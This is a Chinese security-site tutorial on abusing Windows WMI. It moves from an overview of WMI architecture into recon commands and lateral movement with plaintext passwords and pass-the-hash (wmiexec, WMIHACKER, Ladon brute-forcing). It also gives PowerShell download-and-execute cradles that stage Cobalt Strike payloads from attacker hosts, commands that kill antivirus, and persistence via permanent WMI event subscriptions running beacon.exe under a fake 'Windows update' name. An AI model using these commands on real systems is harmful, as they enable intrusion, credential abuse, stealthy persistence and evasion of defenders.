[robots](/35efd2d4bd.html)

[ ![](/img/job/logo.svg) ](https://www.anquanke.com)

  * [首页](/)
  * 文章 

|文章分类

[安全知识](/knowledge)| [安全资讯](/news)| [安全活动](/activity)| [安全工具](/tool)|  
[招聘信息](/job)

|内容精选

[360网络安全周报](/week-list)| [安全客季刊](/discovery) |  
[专题列表](/subject-list)

|热门标签

[ 活动 ](/tag/活动)| [ 安全活动 ](/tag/安全活动)| [ CTF ](/tag/CTF)| [ 恶意软件 ](/tag/恶意软件)|
[ 每日安全热点 ](/tag/每日安全热点)| [ 网络安全热点 ](/tag/网络安全热点)| [ Web安全 ](/tag/Web安全)| [
漏洞预警 ](/tag/漏洞预警)| [ 渗透测试 ](/tag/渗透测试)| [ Pwn ](/tag/Pwn)|

  * [漏洞](/vul)
  * [SRC导航](/src)
  * ![](/img/job/new.svg) [招聘](/job-list)
  * [内容精选](/discovery)

![](https://p0.ssl.qhimg.com/t010133a1346bd31419.png)

![](https://p0.ssl.qhimg.com/t01103704213901dd1e.png) [
![](https://p0.ssl.qhimg.com/t0161d2c7f7fe89cb91.png) ](/app)

![投稿](https://p0.ssl.qhimg.com/t01e18bc83d1362b57e.png)投稿

[ 登录 ](/login) [ 注册 ](/register)

  * 主页2 个人主页
  * [ 消息 我的消息](/setting?p=message)

  * [ 设置 个人设置](/setting)
  * [ 关闭 退出登录](javascript:void\(0\))

__

  * 首页
  * 安全知识
  * 安全资讯
  * 招聘信息
  * 安全活动
  * APP下载

#  WMI攻与防

阅读量    **82812** |

分享到： ![QQ空间](https://p0.ssl.qhimg.com/sdm/28_28_100/t014ba42aad7714178d.png)
![新浪微博](https://p0.ssl.qhimg.com/sdm/28_28_100/t01f0d8694dda79069d.png)
![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)
![QQ](https://p0.ssl.qhimg.com/sdm/28_28_100/t010d95bee6ba3edf60.png)
![facebook](https://p0.ssl.qhimg.com/sdm/28_28_100/t01a5e75c16cffcb0ba.png)
![twitter](https://p0.ssl.qhimg.com/sdm/28_28_100/t01fc30c819f51e9cff.png)

发布时间：2021-08-05 15:30:17

[robots](/35efd2d4bd.html)

## 讲在前面：

笔者在阅读了WMI的微软官方文档以及国内优秀前辈的介绍文章后，获益匪浅，WMI是一个较为老的知识点了，但是对于想要简单理解WMI的同学来说，对于一个新的知识点进行理解最好是能够有生动形象的例子进行抛砖引玉式的解读，将晦涩难懂的知识点吃透、理解后用简单的话语将其作用表达清楚，使其读者能够快速的理解并为读者接下来深入理解打好基础，以便在攻防中更好的利用WMI，所以此篇文章笔者使用通俗的话语将WMI表达清楚，在下文中对于基础薄弱的同学对于COM组件、Provider方法等专业名词可不做深度理解，只需要知道是WMI这个庞大工具的零件罢了，此文不足之处，望读者海涵。

## WMI是什么

### **简介：**

WMI是Windows在Powershell还未发布前，微软用来管理Windows系统的重要数据库工具，WMI本身的组织架构是一个数据库架构，WMI
服务使用 DCOM（TCP 端口135）或 WinRM 协议（SOAP–端口 5985，如下图

此图清晰明了的显示了WMI基础结构与 WMI 提供者和托管对象之间的关系，它还显示了 WMI 基础结构和 WMI
使用者之间的关系，同样我们也可以使用下图来理解。

**WMI Consumers(WMI使用者)**

它位于WMI构架的最顶层，是WMI技术使用的载体。

  * 如果我们是C++程序员，我们可以通过COM技术直接与下层通信。
  * 而脚本语言则要支持WMI Scripting API，间接与下层通信。
  * 对于.net平台语言，则要使用System.Management域相关功能与下层通信。

这些WMI的使用者，可以查询、枚举数据，也可以运行Provider的方法，还有WMI事件通知。当然这些数据操作都是要有相应的Provider来提供。

**WMI Infrastructure(WMI基础结构)**

WMI基础结构是Windows系统的系统组件。它包含两个模块：包含WMI Core(WMI核心)的WMI
Service(WMI服务)(Winmgmt)和WMI Repository(WMI存储库)。WMI存储库是通过WMI
Namespace(WMI命名空间)组织起来的。在系统启动时，WMI服务会创建诸如root\default、root\cimv2和root\subscription等WMI命名空间，同时会预安装一部分WMI类的定义信息到这些命名空间中。其他命名空间是在操作系统或者产品调用有关WMI提供者(WMI
Provider)时才被创建出来的。简而言之，WMI存储库是用于存储WMI静态数据的存储空间。WMI服务扮演着WMi提供者、管理应用和WMI存储库之间的协调者角色。一般来说，它是通过一个共享的服务进程Svchost来实施工作的。当第一个管理应用向WMI命名空间发起连接时，WMI服务将会启动。当管理应用不再调用WMI时，WMI服务将会关闭或者进入低内存状态。如我们上图所示，WMI服务和上层应用之间是通过COM接口来实现的。当一个应用通过接口向WMI发起请求时，WMI将判断该请求是请求静态数据还是动态数据。

  * 如果请求的是一个静态数据，WMI将从WMI存储库中查找数据并返回；
  * 如果请求的是一个动态数据，比如一个托管对象的当前内存情况，WMI服务将请求传递给已经在WMI服务中注册的相应的WMI提供者。WMI提供者将数据返回给WMI服务，WMI服务再将结果返回给请求的应用。

**Managed object and WMI providers(托管对象和WMI提供者)**

WMI提供者是一个监控一个或者多个托管对象的COM接口。一个托管对象是一个逻辑或者物理组件，比如硬盘驱动器、网络适配器、数据库系统、操作系统、进程或者服务。和驱动相似，WMI提供者通过托管对象提供的数据向WMI服务提供数据，同时将WMI服务的请求传递给托管对象。

###  WMI做什么

在Powershell未发布前用来管理Windows 2000、Windows95、Windows98、WindowsNT等操作系统
，当然如今的所有Windows系统依旧可以使用WMI来进行管理。

> **_注意：_**  
>
> 在上图中我我们可以发现也可以理解，不论Powershell、VBScript或者其他什么语言，其本质还是使用.NET来访问WMI的类库，都是因为WMI向外暴露的一组API，然后进行管理，Powershell的发布只是让我们管理的方式多了一种，本质上没有改变去使用WMI。

###  为什么使用WMI

**对于Windows运维管理人员**

对于Windows运维管理功能主要是：访问本地主机的一些信息和服务，可以管理远程计算机（当然你必须要拥有足够的权限，并且双方开启WMI服务，且135端口的防火墙策略是入站出站允许的），比如：重启，关机，关闭进程，创建进程等。可以自定义脚本来进行自动化运维，十分方便，例如可以使用wmic、wbemtest工具。WMIC命令解释。

**使用Powershell来操作WMI管理：**

Powershell查询命名空间

    
    
    Get-WmiObject -Class __namespace -Namespace root | select name
    

Powershell查询BIOS信息

    
    
    Get-WmiObject -Class  Win32_BIOS
    

Powershell查询计算机信息

    
    
    Get-WmiObject -Class  Win32_Operatingsystem
    

Powershell查询

    
    
    Get-WmiObject -Namespace root\SecurityCenter2 -Class AntiVirusProduct
    #注意：在旧版中查询杀软的WMI命名空间为SecurityCenter
    

> ***注意：** 这里Powershell操作WMI的对象使用的是内置模块Get-
> WmiObject，以及查询的类为Win32_Service类，Win32_Service的其他类在官方文档中已经罗列详细：Win32类计算机硬件类、操作系统类等，但是要注意Win32_Service不是唯一可以操作WMI的类，以下类可以交替使用。*

  * WIn32_Service
  * Win32_BaseService
  * Win32_TerminalService
  * Win32_SystemDriver

**使用wmic来操作WMI管理：**

    
    
    #查询windows机器版本和服务位数和.net版本
    wmic os get caption
    wmic os get osarchitecture
    wmic OS get Caption,CSDVersion,OSArchitecture,Version
    #查询本机所有盘符
    fsutil fsinfo drives
    shell wmic logicaldisk list brief
    shell wmic logicaldisk get description,name,size,freespace /value
    #查看系统中⽹卡的IP地址和MAC地址
    wmic nicconfig get ipaddress,macaddress
    #⽤户列表
    wmic useraccount list brief
    #查看当前系统是否有屏保保护，延迟是多少
    wmic desktop get screensaversecure,screensavertimeout
    #域控机器
    wmic ntdomain list brief
    #查询杀软
    wmic /namespace:\\root\securitycenter2 path antispywareproduct GET displayName,productState, pathToSignedProductExe && wmic /namespace:\\root\securitycenter2 path antivirusproduct GET displayName,productState, pathToSignedProductExe
    #查询启动项
    wmic startup list brief |more
    #获取打补丁信息
    wmic qfe list
    #启动的程序
    wmic startup list brief
    #启动的程序
    wmic startup list full
    

**对于网络安全人员**

对于网络安全人员在攻防当中，利用WMI进行横向移动、权限维持、权限提升、包括免杀都可以进行利用，这个在接下来的三个不同的篇章中进行介绍。

## WMI利用（横向移动）

###  讲在前面：

上一篇文章我们简单的解释了什么是WMI，WMI做什么，为什么使用WMI。本文是笔者在阅读国内部分的解释WMI横向移动的文章后写下的一篇文章，希望帮助同学们在攻防中进入横向移动后根据实际场景利用WMI来解决问题。在横向移动中的固定过程中一定离不开“信息收集”，然后分析信息根据实际场景（工作组或者域）来进行横向移动，至于使用什么工具，为什么使用这个工具，笔者使用WMI的意见。所以本文分为三个段落，信息收集、横向移动、部分意见。  
信息收集

###  信息收集

> ***注意**
> ：信息收集需要根据实际场景来进行收集，而不是说笔者罗列的就是必须要做，WMI可以做的信息收集操作远不至笔者罗列的如此，希望同学能够举一反三，自由搭配，参考微软官方文档，根据实际情况获取所需。*
>
> ***注意**
> ：wmic命令需要本地管理员或域管理员才可以进行正常使用，普通权限用户若想要使用wmi，可以修改普通用户的ACL，不过修改用户的ACL也需要管理员权限，这里笔者单独罗列小结：普通用户使用wmic。以下命令均在2008R2、2012R2、2016上进行测试,部分命令在虚拟机中测试不行，例如查询杀软。*

**使用WMIC管理wmi**

    
    
    wmic logon list brief #登录⽤户
    wmic ntdomain list brief #域控机器
    wmic useraccount list brief #⽤户列表
    wmic share get name,path #查看系统共享
    wmic service list brief |more #服务列表
    wmic startup list full #识别开机启动的程序，包括路径
    wmic fsdir "c:\\test" call delete #删除C盘下的test目录
    wmic nteventlog get path,filename,writeable #查看系统中开启的⽇志
    wmic nicconfig get ipaddress,macaddress #查看系统中⽹卡的IP地址和MAC地址
    wmic qfe get description,installedOn #使⽤wmic识别安装到系统中的补丁情况
    wmic product get name,version #查看系统中安装的软件以及版本，2008R2上执行后无反应。
    wmic useraccount where "name='%UserName%'" call rename newUserName #更改当前用户名
    wmic useraccount where "name='Administrator'" call Rename admin #更改指定用户名
    wmic bios list full | findstr /i "vmware" #查看当前系统是否是VMWARE，可以按照实际情况进行筛选
    wmic desktop get screensaversecure,screensavertimeout #查看当前系统是否有屏保保护，延迟是多少
    wmic process where name="vmtoolsd.exe" get executablepath #获取指定进程可执行文件的路径
    wmic environment where "name='temp'" get UserName,VariableValue #获取temp环境变量
    
    ###查询当前主机的杀毒软件
    wmic process where "name like '%forti%'" get name
    wmic process where name="FortiTray.exe" call terminate
    wmic /namespace:\\root\securitycenter2 path antivirusproduct GET displayName,productState,pathToSignedProductExe
    wmic /namespace:\\root\securitycenter2 path antispywareproduct GET displayName,productState, pathToSignedProductExe & wmic /namespace:\\root\securitycenter2 path antivirusproduct GET displayName,productState, pathToSignedProductExe
    wmic /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List
    ###
    
    ###查询windows机器版本和服务位数和.net版本
    wmic os get caption
    wmic os get osarchitecture
    wmic OS get Caption,CSDVersion,OSArchitecture,Version
    wmic product where "Name like 'Microsoft .Net%'" get Name, Version
    ###
    
    ###查询本机所有盘符
    wmic logicaldisk list brief
    wmic logicaldisk get description,name,size,freespace /value
    ###
    
    ###卸载和重新安装程序
    wmic product where "name like '%Office%'" get name
    wmic product where name="Office" call uninstall
    ###
    
    ### 查看某个进程的详细信息 （路径，命令⾏参数等）
    wmic process where name="chrome.exe" list full
    wmic process where name="frp.exe" get executablepath,name,ProcessId   进程路径
    wmic process where caption="frp.exe" get caption,commandline /value
    ###
    
    ### 更改PATH环境变量值，新增c:\whoami
    wmic environment where "name='path' and username='<system>'" set VariableValue="%path%;c:\whoami
    ###
    
    ### 查看某个进程的详细信息-PID
    wmic process list brief
    tasklist /SVC | findstr frp.exe
    wmic process where ProcessId=3604 get ParentProcessId,commandline,processid,executablepath,name,CreationClassName,CreationDate
    ###
    
    ### 终⽌⼀个进程
    wmic process where name ="xshell.exe" call terminate
    ntsd -c q -p 进程的PID
    taskkill -im pid
    ###
    
    ###获取电脑产品编号和型号信息
    wmic baseboard get Product,SerialNumber
    wmic bios get serialnumber
    ###
    
    ###安装软件
    wmic product get name,version
    wmic product list brief
    

**使用Powershell操作wmi**

    
    
    Get-WmiObject -Namespace ROOT\CIMV2 -Class Win32_Share  #共享
    Get-WmiObject -Namespace ROOT\CIMV2 -Class CIM_DataFile #⽂件/⽬录列表
    Get-WmiObject -Namespace ROOT\CIMV2 -Class Win32_Volume #磁盘卷列表
    Get-WmiObject -Namespace ROOT\CIMV2 -Class Win32_Process #当前进程
    Get-WmiObject -Namespace ROOT\CIMV2 -Class Win32_Service #列举服务
    Get-WmiObject -Namespace ROOT\CIMV2 -Class Win32_NtLogEvent #⽇志
    Get-WmiObject -Namespace ROOT\CIMV2 -Class Win32_LoggedOnUser #登陆账户
    Get-WmiObject -Namespace ROOT\CIMV2 -Class Win32_QuickFixEngineering #补丁
    Get-WmiObject -Namespace root\SecurityCenter2 -Class AntiVirusProduct #杀毒软件
    
    ###操作系统相关信息
    Get-WmiObject -Namespace ROOT\CIMV2 -Class Win32_OperatingSystem
    Get-WmiObject -Namespace ROOT\CIMV2 -Class Win32_ComputerSystem
    Get-WmiObject -Namespace ROOT\CIMV2 -Class Win32_BIOS
    ###
    
    ###注册表操作
    Get-WmiObject -Namespace ROOT\DEFAULT -Class StdRegProv
    Push-Location HKLM:SOFTWARE\Microsoft\Windows\CurrentVersion\Run
    Get-ItemProperty OptionalComponents
    

###  横向移动

> ***注意**
> ：分析完信息后，根据已掌握的信息开始横向移动，无论您作何考虑，都需要利用到工具来进行操作，工具可以帮助您无需理解或多或少的知识，您只需读懂README即可，来帮助您获取shell，上传，下载，创建服务等操作，笔者会在此段中罗列部分WMI的工具以及部分命令用作横向移动，并在第三段给出部分实际利用的意见。*
>
> **wmic调用cmd** ***注意** ：以下命令需要管理员权限。*
    
    
    ###向指定IP执行cmd命令
    wmic /node:10.10.0.10 /user:administrator /password:win@123 process call create "cmd.exe /c ipconfig >c:\ip.txt"
    

**wmic上线CS**

> ***注意** ：请注意powershell对于特殊字符的转义，例如“，@，#，$等等。*

  * Scripted Web Delivery

    
    
    wmic /NODE:192.168.8.180 /user:"administrator" /password:"win@123" PROCESS call create "powershell.exe -nop -w hidden -c \"IEX ((new-object net.webclient).downloadstring('http://xx.xx.xx.xx:8881/a'))\""
    

选择攻击模块

设置C2的Host以及监听器

在客户机上执行wmic命令，让指定的主机上线CS

  * payload generator

> ***注意** ：测试下载时，可以自行使用Python开启WEB共享服务。*
    
    
    wmic /NODE:192.168.8.179 /user:"administrator" /password:"Aatest" PROCESS call create "powershell -nop -exec bypass -c \"IEX(New-Object Net.WebClient).DownloadString('http://192.168.8.191:8000/payload.ps1');\""
    

选择攻击模块

设置监听器，并选择Powershell作为载荷

在客户机上执行wmic命令，让指定机器上线CS

**impacket-wmiexec.py**

> ***注意** ：请按照实际情况选择wmiexec.py的参数。*
    
    
    "注意：根据impacket的版本不同，依赖的python版本也不同，这里笔者使用最新版本impacket，依赖python3。"
    "注意：遇到特殊字符使用\进行转移，例如123@456，转义后：123\@456"
    python3 wmiexec.py  用户名:密码@目标IP
    python3 wmiexec.py  域名/用户名:密码@目标IP    #哈希传递获得shell
    python3 wmiexec.py  域名/用户名:密码@目标IP    "ipconfig"   #执行命令
    python3 wmiexec.py -hashes LM Hash:NT Hash 域名/用户名@目标IP    #哈希传递获得shell
    python3 wmiexec.py -hashes LM Hash:NT Hash 域名/用户名@目标IP "ipconfig"   #执行命令
    

使用账号密码远程工作组机器

使用账号密码远程域机器

使用hash远程工作组机器

使用hash远程域机器

> ***注意** ：wmiexec 使⽤445端⼝传回显。*

**impacket-wmiexe.exe**

    
    
    wmiexec.exe test1.com/win16:win16@10.10.0.10 -dc-ip 10.10.0.10
    

使用账号密码远程域机器

**Ladon**

模块功能 | 目标端口 | 目标系统 | 使用教程  
---|---|---|---  
WMI爆破 | 135 | Windows | [教程](http://k8gege.org/Ladon/WmiScan.html)  
WMI-NtlmHash爆破 | 135 | Windows | [教程](http://k8gege.org/Ladon/WmiScan.html)  
WmiExec | 135 | Windows | 只需要135端口通过注册表回显，不依赖445、Powershell  
WmiExec2 | 135 | Windows | 只需135端口通过注册表回显，但依赖Powershell  
  
**WMI爆破(135端口)**

> ***注意** ：请提前在ladon.exe目录下准备好user.txt和pass.txt。*
    
    
    ladon.exe 192.168.8.192/24 WmiScan
    

**WMI-NtlmHash爆破（135端口）**

    
    
    ladon.exe  192.168.8.192 WmiHashScan
    

**WmiExec**

    
    
    ladon.exe wmiexec 192.168.8.192 Administrator win@123 cmd whoami
    

Ladon wmiexec成功执行命令

**WmiExec2**

    
    
    ###在工作组尝试执行命令
    ladon.exe wmiexec2 192.168.8.192 Administrator win@123 cmd whoami
    ###在域内尝试执行命令
    ladon.exe wmiexec2 10.10.0.10 test1\Administrator win@123 cmd whoami
    

Ladon wmiexec2成功在工作组执行命令

Ladon wmiexec2成功在域内执行命令

**WMIcmd**

> ***注意** ：WMIcmd需要.NET4.5.2的支持。*
    
    
    WMIcmd.exe -h IP -d hostname -u localadmin -p theirpassword -c "command"
    

WMIcmd.exe在工作组上使用

    
    
    WMIcmd.exe -h IP -d domain -u domainadmin -p theirpassword -c "command"
    

WMIcmd.exe在域内使用

**pth-wmic**

> ***注意** ：此为kali内置工具，只能执行一些WMI命令，无法执行其他命令*
    
    
    ###查询指定主机的用户列表select Name from Win32_UserAccount###
    pth-wmic -U pig/Administrator%00000000000000000000000000000000:c56ade0c054ba703d9f56e302224bbb3 //192.168.8.181 "select Name from Win32_UserAccount"
    

使用pth-wmic来远程管理指定主机的WMI

**WMIHACKER**

> ***注意** ：wmihacker.vbs是在wmiexec.vbs基础上进行改进并优化的,新增了上传下载功能，其所需管理员权限。*
    
    
    ###命令执行后显示结果
    cscript WMIHACKER_0.6.vbs /cmd 172.16.94.187 administrator "Password!" "systeminfo" 1
    ###命令执行后不显示任何结果
    cscript WMIHACKER_0.6.vbs /cmd 172.16.94.187 administrator "Password!" "systeminfo > c:\1.txt" 0
    ###获取交互式shell
    cscript WMIHACKER_0.6.vbs /shell 172.16.94.187 administrator "Password!"
    ###文件上传：将本地calc.exe复制到远程主机c:\calc.exe
    cscript wmihacker_0.6.vbs /upload 172.16.94.187 administrator "Password!" "c:\windows\system32\calc.exe" "c:\calc"
    ###文件下载：将远程主机calc.exe下载到本地c:\calc.exe
    cscript wmihacker_0.6.vbs /download 172.16.94.187 administrator "Password!" "c:\calc" "c:\windows\system32\calc.exe"
    
    
    
    #获取半交互式shell
    cscript.exe wmihacker.vbs /shell 192.168.8.179 Administrator "win@123"
    

工作组内获取半交互式shell

    
    
    #获取半交互式shell
    cscript.exe wmihacker.vbs /shell 10.10.0.10 win16 "win16"
    

域内获取半交互式shell

    
    
    #将本地calc.exe复制到远程主机c:\calc.exe
    cscript wmihacker_0.6.vbs /upload 192.168.8.179 administrator "win@123" "c:\windows\system32\calc.exe" "c:\calc"
    

工作组内进行文件上传

上传成功

**Invoke-WMIMethod**

> ***注意**
> ：该模块为Powershell内置模块，以下为示例，可以自由组合命令进行测试。示例在Windows2008R2、Windows2012R2、Windows2016均测试成功。*
    
    
    $User            #目标系统用户名
    $Password        #目标系统密码
    $Cred            #账号密码整合，导入Credential
    Invoke-WMIMethod #远程运行指定程序
    #####---------------------------#####
    
    $User = "WIN-D5IP32RU4A9\administrator"
    $Password= ConvertTo-SecureString -String "win@123" -AsPlainText -Force
    $Cred = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $User , $Password
    Invoke-WMIMethod -Class Win32_Process -Name Create -ArgumentList "calc.exe" -ComputerName "192.168.8.179" -Credential $Cred
    

执行Powershell命令，成功创建运行cmd.exe，进程号为3192

3192进程对应的cmd.exe

**Invoke-WmiCommand**

> ***注意** ：Invoke-
> WmiCommand.ps1为PowerSploit内置利用脚本，以下示例在Windows2008R2、Windows2012R2、Windows2016均测试成功。*
    
    
    IEX....               #下载脚本并导入系统
    $User                 #目标系统用户名
    $Password             #目标系统密码
    $Cred                 #账号密码整合，导入Credential
    $Remote               #远程运行指定命令或程序
    $Remote.PayloadOutput #将执行结果输出到屏幕上
    #####---------------------------#####
    
    IEX(New-Object Net.Webclient).DownloadString('http://192.168.8.190:8000/Invoke-WmiCommand.ps1')
    $User = "WIN-D5IP32RU4A9\administrator"
    $Password = ConvertTo-SecureString -String "win@123" -AsPlainText -Force
    $Cred = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $User,$Password
    $Remote = Invoke-WmiCommand -Payload {whoami} -Credential $Cred -ComputerName 192.168.8.179
    $Remote.PayloadOutput
    

执行成功，whoami的命令得到回显

**Invoke-WMIExec.ps1**

    
    
    Invoke-WMIExec -Target 192.168.0.110  -Username Administrator -Hash 3edc68a5debd735545ddf69fb3c224a8 -Command "cmd /c ipconfig >>c:\ipconfig.txt" -Verbose
    

在工作组中内执行该PS1脚本

    
    
    Invoke-WMIExec -Target 10.10.0.10 -Domain test1.com -Username Administrator -Hash 3edc68a5debd735545ddf69fb3c224a8 -Command "cmd /c ipconfig >>c:\ipconfig.txt" -VerboseSharp-WMIExec
    

在域内执行该PS1脚本

**WmiSploit**

  * Enter-WmiShell（建立交互式shell）

    
    
    Enter-WmiShell -ComputerName WIN-D5IP32RU4A9 -UserName Administrator
    

输入指定帐户凭据

利用Enter-WmiShell模块获取工作组交互式shell

利用Enter-WmiShell模块获取域内交互式shell

  * Invoke-WmiCommand(执行命令)

    
    
    Invoke-WmiCommand -ComputerName WIN-D5IP32RU4A9 -ScriptBlock {tasklist}
    

**WMImplant**

> ***注意** ：WMimplant 的功能一旦执行就可以在主菜单中找到。它可以执行文件传输操作、横向移动和主机侦察。
> CHANGE_USER命令做存储凭据使用。它有一个 shell 功能，可以使用 command_exec 触发，文件操作也可以远程执行。*

使用CHANGE_USER后执行命令

使用shell执行命令

文件操作

**WinRM**

> ***注意** ：Windows默认WinRM需要设置信任来源地址，在测试前，请设置信任所有来源地址，也就是允许被任意主机连接。*
    
    
    winrm set winrm/config/client @{TrustedHosts="*"}
    

允许被任意主机连接

    
    
    winrm invoke Create wmicimv2/win32_process @{CommandLine="calc.exe"}
    

在本地弹出计算器

    
    
    winrm invoke Create wmicimv2/win32_process @{CommandLine="calc.exe"} -r:
    https://192.168.8.192:5985
     -u:administrator -p:win@123
    

远程静默启动进程

###  部分意见

笔者上述罗列的部分工具原理都是一样，在实现的方法上各有千秋，建议各位同学根据实际场景需要针对性的DIY来满足自己的需求，解决问题，笔者建议ladon的爆破工具，wmic信息收集、以及WinRM需要留意。希望在实际攻防中，根据自身经验优先选择现有工具进行操作，如若没有趁手的，则可以自己使用.net或者VBS来进行开发。

**本文参考文章**

  * [内网横移之WinRM](https://0x0c.cc/2019/09/25/%E5%86%85%E7%BD%91%E6%A8%AA%E7%A7%BB%E4%B9%8BWinRM/)
  * [内网渗透|基于WMI的横向移动](https://www.se7ensec.cn/2020/07/12/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E5%9F%BA%E4%BA%8Ewmi%E7%9A%84%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/)
  * [WmiScan 135端口智能密码/WMI密码爆破](http://k8gege.org/Ladon/WmiScan.html)
  * [WinRM的横向移动详解](https://www.freebuf.com/articles/system/259632.html)
  * [WMI横向移动](https://blog.csdn.net/lhh134/article/details/104150949)
  * [不需要 Win32_Process – 扩展 WMI 横向运动](https://www.cybereason.com/blog/wmi-lateral-movement-win32)

## WMI利用（权限维持）

###  讲在前面：

在简单了解了WMI后，我们开始了横向移动，包括其中的信息收集，工具利用。那么在我们短暂的获取权限后，如何才能将权限持久化，也就是所说的权限维持住呢？笔者看了国内外部分文章后，发现WMI做权限维持主要是介绍WMI事件，并将其分为永久事件和临时事件，本文参考部分博客文章对WMI事件进行讲解，不足之处，望及时指出。

###  什么是WMI事件

WMI事件，即特定对象的属性发生改变时发出的通知，其中包括增加、修改、删除三种类型。可以使用wmic来进行操作。通俗的可以说：WMI内部出现什么变化就由WMI事件来进行通知。  
WMI事件中的事件消费者可以分为临时和永久两类，临时的事件消费者只在其运行期间关心特定事件并进行处理，永久消费者作为类的实例注册在WMI命名空间中，一直有效到它被注销。所以在权限维持中一般我们使用WMI永久事件来进行。  
对于WMI事件的官方解释以及部分博客解释：

  * [WMI事件通知](https://cloud.tencent.com/developer/article/1383673)
  * [接收WMI事件](https://docs.microsoft.com/en-us/windows/win32/wmisdk/receiving-a-wmi-event)

**查询事件**

    
    
    #列出事件过滤器
    Get-WMIObject -Namespace root\Subscription -Class __EventFilter
    
    #列出事件消费者
    Get-WMIObject -Namespace root\Subscription -Class __EventConsumer
    
    #列出事件绑定
    Get-WMIObject -Namespace root\Subscription -Class __FilterToConsumerBinding
    

列出事件过滤器

列出事件消费者

**删除事件**

    
    
    #删除事件过滤器
    Get-WMIObject -Namespace root\Subscription -Class __EventFilter -Filter "Name='事件过滤器名'" | Remove-WmiObject -Verbose
    
    #删除事件消费者
    Get-WMIObject -Namespace root\Subscription -Class CommandLineEventConsumer -Filter "Name='事件消费者名'" | Remove-WmiObject -Verbose
    
    #删除事件绑定
    Get-WMIObject -Namespace root\Subscription -Class __FilterToConsumerBinding -Filter "__Path LIKE '%事件绑定名%'" | Remove-WmiObject -Verbose
    

删除事件过滤器

删除事件消费者

删除事件绑定

###  WMI永久事件

> ***注意**
> ：没有指定时间轮询则需要机器重启才可以进行WMI轮询，需要注意的一点是，WMI可以任意指定触发条件，例如用户退出，某个程序创建，结束等等*。

**wmic添加永久事件**

    
    
    #注册一个 WMI 事件过滤器
    wmic /NAMESPACE:"\\root\subscription" PATH __EventFilter CREATE Name="BugSecFilter", EventNamespace = "root\cimv2", QueryLanguage="WQL", Query="SELECT * FROM __TimerEvent WITHIN 10 WHERE TimerID = 'BugSecFilter'"
    
    #注册一个 WMI 事件消费者
    wmic /NAMESPACE:"\\root\subscription" PATH CommandLineEventConsumer CREATE Name="BugSecConsumer", CommandLineTemplate="cmd.exe /c  c:\beacon.exe"
    
    #将事件消费者绑定到事件过滤器
    wmic /NAMESPACE:"\\root\subscription" PATH __FilterToConsumerBinding CREATE Filter='\\.\root\subscription:__EventFilter.Name="BugSecFilter"', Consumer='\\.\root\subscription:CommandLineEventConsumer.Name="BugSecConsumer"'
    

**Powershell添加永久事件**

> ***注意** ：可以考虑添加Powershell的时间间隔器，需要上线至C2则将Payload替换成C2的exe或者dll或者ps1即可。*
>
> ***注意** ：需要修改一下参数*
    
    
    IntervalBetweenEvents ###修改间隔时间，以毫秒为单位。
    
    $EventFilterArgs 中的 Name ###修改筛选器名称。
    
    Query ###修改其中WQL语句，以下脚本中可不用修改，但TimerID需和$TimerArgs中的参数匹配。
    
    $FinalPayload ###修改Payload，可以指定执行Powershell，或者cmd或者其他命令。
    
    $CommandLineConsumerArgs 中的 Name ###修改消费者名称。
    
    
    
    $TimerArgs = @{
     IntervalBetweenEvents = ([UInt32] 2000) # 30 min
     SkipIfPassed = $False
     TimerId ="Trigger" };
    
    
    $EventFilterArgs = @{
    EventNamespace = 'root/cimv2'
    Name = "Windows update trigger"
    Query = "SELECT * FROM __TimerEvent WHERE TimerID = 'Trigger'"
    QueryLanguage = 'WQL' };
    
    
    $Filter = Set-WmiInstance -Namespace root/subscription -Class __EventFilter -Arguments $EventFilterArgs;
    $FinalPayload = 'cmd.exe /c c:\beacon.exe'
    
    $CommandLineConsumerArgs = @{
     Name = "Windows update consumer"
     CommandLineTemplate = $FinalPayload};
    
    
    $Consumer = Set-WmiInstance -Namespace root/subscription -Class CommandLineEventConsumer -Arguments $CommandLineConsumerArgs;
    
    
    $FilterToConsumerArgs = @{
     Filter = $Filter
     Consumer = $Consumer};
    
    
    $FilterToConsumerBinding = Set-WmiInstance -Namespace root/subscription -Class __FilterToConsumerBinding -Arguments $FilterToConsumerArgs;
    

> ***注意**
> ：上述脚本出现的WQL语句，也可以指定WITHIN来指定间隔时间，以秒为单位，但是需提前指定TimerID，可以自行修改PS1脚本进行完善，将添加后门、删除后门的操作集成到一个脚本内完成，同时免杀的操作可以针对性的进行混淆或编码的操作。*
    
    
    SELECT * FROM __TimerEvent WITHIN 10 WHERE TimerID = 'Trigger'
    

**上线C2**

> ***注意**
> ：将上述Powershell脚本替换其执行的Payload进行本地执行，另存为ps1格式并修改其轮询的时间。若想做成远程下载格式，则需要将Powershell做好免杀的操作。*

运行ps1脚本后成功上线

**Mof文件添加事件**

> ***注意** ：笔者在测试Mof文件添加事件时，编译后的确能够正常添加事件，但是未能执行指定命令。*
    
    
    #PRAGMA NAMESPACE ("\\\\.\\root\\subscription")
    instance of CommandLineEventConsumer as $Cons
    {
        Name = "test1comsumer";
        RunInteractively=false;
        CommandLineTemplate="cmd.exe /c c:\beacon.exe";
    };
    
    instance of __EventFilter as $Filt
    {
        Name = "test1filter";
        EventNamespace = "root\\cimv2";
        Query ="SELECT * FROM __TimerEvent  WITHIN 10 WHERE TimerID = 'test1filter'";
        QueryLanguage = "WQL";
    };
    
    instance of __FilterToConsumerBinding
    { 
         Filter = $Filt;
         Consumer = $Cons;
    };
    

编译

    
    
    mofcomp.exe wmi.mof
    

事件添加成功

**本文参考文章：**

[WMI](https://github.com/AxelPotato/WMI)

## WMI利用（权限提升）

###  讲在前面：

WMI用作权限提升这一块笔者能力有限，未能搜集到更多的信息，只发现一个较为原始的漏洞CVE-2009-0078漏洞，较为原始，能力有限，不做细致分析。

###  CVE-2009-0078

**简介** ：Microsoft Windows XP SP2 和 SP3、Server 2003 SP1 和 SP2、Vista Gold 和 SP1
以及 Server 2008 中的 Windows Management Instrumentation (WMI)
提供程序没有在一组不同的进程之间正确实现隔离，同一用户下运行的两个独立进程可以完全访问对方的文件句柄、注册表项等资源。WMI
提供程序主机在某些情况下会使用系统令牌，如果攻击者可以以网络服务或本地服务访问访问，攻击者就执行代码探索系统令牌的
WMI提供程序主机进程。找到了SYSTEM令牌，就可以进入SYSTEM级的提升了  
